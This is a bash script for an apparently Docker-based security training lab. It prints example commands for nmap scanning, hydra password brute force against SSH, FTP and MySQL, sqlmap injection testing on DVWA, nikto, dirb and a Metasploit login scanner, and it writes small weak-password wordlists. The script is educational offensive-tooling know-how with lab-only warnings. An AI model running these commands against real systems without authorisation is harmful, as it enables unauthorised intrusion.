#!/bin/bash

# Educational Security Testing Script
# WARNING: Use only in isolated lab environments for learning purposes
# Never run against systems you don't own or without explicit permission

echo "=========================================="
echo "Educational Security Lab Testing Examples"
echo "=========================================="
echo ""
echo "WARNING: This script is for educational purposes only."
echo "Only run in isolated lab environments!"
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Target IPs (adjust based on your Docker network)
WEBAPP_IP="172.20.0.2"  # vulnerable-webapp
DB_IP="172.20.0.3"      # vulnerable-db
FTP_IP="172.20.0.4"     # vulnerable-ftp
SSH_IP="172.20.0.5"     # vulnerable-ssh

echo -e "${GREEN}[*] Starting Educational Security Assessment${NC}"
echo ""

# 1. NMAP - Network Discovery and Service Detection
echo -e "${YELLOW}[1] NMAP - Network Discovery${NC}"
echo "Discovering services on the vulnerable network..."
echo ""

# Basic service scan
echo "# Basic service detection:"
echo "docker exec kali-tools nmap -sV -p- 172.20.0.0/24"
echo ""

# Specific service version detection
echo "# Detailed service scan on web server:"
echo "docker exec kali-tools nmap -sV -sC -p 80,443 $WEBAPP_IP"
echo ""

# Vulnerability scanning
echo "# Check for common vulnerabilities:"
echo "docker exec kali-tools nmap --script vuln $WEBAPP_IP"
echo ""

# 2. HYDRA - Brute Force Attack Examples
echo -e "${YELLOW}[2] HYDRA - Password Brute Force${NC}"
echo "Testing weak credentials..."
echo ""

# SSH brute force
echo "# SSH brute force (port 2222):"
echo "docker exec kali-tools hydra -l root -P /wordlists/common-passwords.txt ssh://$SSH_IP:2222"
echo ""

# FTP brute force
echo "# FTP brute force:"
echo "docker exec kali-tools hydra -l admin -P /wordlists/common-passwords.txt ftp://$FTP_IP"
echo ""

# MySQL brute force
echo "# MySQL brute force:"
echo "docker exec kali-tools hydra -l root -P /wordlists/common-passwords.txt mysql://$DB_IP"
echo ""

# 3. SQLMAP - SQL Injection Testing
echo -e "${YELLOW}[3] SQLMAP - SQL Injection Testing${NC}"
echo "Testing for SQL injection vulnerabilities..."
echo ""

echo "# Test DVWA login form for SQL injection:"
echo "docker exec kali-tools sqlmap -u 'http://$WEBAPP_IP/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=abc123' --dbs"
echo ""

# 4. NIKTO - Web Vulnerability Scanner
echo -e "${YELLOW}[4] NIKTO - Web Vulnerability Scanning${NC}"
echo "Scanning web application for vulnerabilities..."
echo ""

echo "# Scan DVWA for web vulnerabilities:"
echo "docker exec kali-tools nikto -h http://$WEBAPP_IP"
echo ""

# 5. DIRB - Directory Brute Force
echo -e "${YELLOW}[5] DIRB - Directory Discovery${NC}"
echo "Discovering hidden directories..."
echo ""

echo "# Directory brute force:"
echo "docker exec kali-tools dirb http://$WEBAPP_IP /usr/share/wordlists/dirb/common.txt"
echo ""

# 6. METASPLOIT - Example Commands (Framework)
echo -e "${YELLOW}[6] METASPLOIT Framework Examples${NC}"
echo "Metasploit module examples..."
echo ""

echo "# Start Metasploit console:"
echo "docker exec -it kali-tools msfconsole"
echo ""
echo "# Inside msfconsole, you could run:"
echo "# use auxiliary/scanner/mysql/mysql_login"
echo "# set RHOSTS $DB_IP"
echo "# set USERNAME root"
echo "# set PASS_FILE /wordlists/common-passwords.txt"
echo "# run"
echo ""

# 7. Create sample wordlists
echo -e "${YELLOW}[7] Creating Sample Wordlists${NC}"
echo "Creating basic wordlists for testing..."

cat << 'EOF' > wordlists/common-passwords.txt
admin
password
123456
admin123
root
toor
weakpassword123
dvwa
test
demo
EOF

cat << 'EOF' > wordlists/common-users.txt
admin
root
user
test
guest
dvwauser
administrator
EOF

echo -e "${GREEN}[*] Sample wordlists created in ./wordlists/${NC}"
echo ""

# 8. Manual Testing Examples
echo -e "${YELLOW}[8] Manual Testing Commands${NC}"
echo "Additional manual testing examples:"
echo ""

echo "# Test FTP connection:"
echo "docker exec kali-tools ftp $FTP_IP"
echo ""

echo "# Test SSH connection:"
echo "docker exec kali-tools ssh root@$SSH_IP -p 2222"
echo ""

echo "# Test MySQL connection:"
echo "docker exec kali-tools mysql -h $DB_IP -u root -pweakpassword123"
echo ""

echo "# Simple netcat port scan:"
echo "docker exec kali-tools nc -zv $WEBAPP_IP 1-1000"
echo ""

# 9. Monitoring and Logging
echo -e "${YELLOW}[9] Monitoring Activity${NC}"
echo "Check security monitoring logs:"
echo ""

echo "# View captured packets (if monitoring is running):"
echo "tcpdump -r ./logs/capture.pcap"
echo ""

echo -e "${RED}=========================================="
echo "IMPORTANT REMINDERS:"
echo "=========================================="
echo "1. This setup is INTENTIONALLY VULNERABLE"
echo "2. Use ONLY in isolated lab environments"
echo "3. Never expose to public networks"
echo "4. Always get permission before testing"
echo "5. Learn responsibly and ethically"
echo "==========================================${NC}"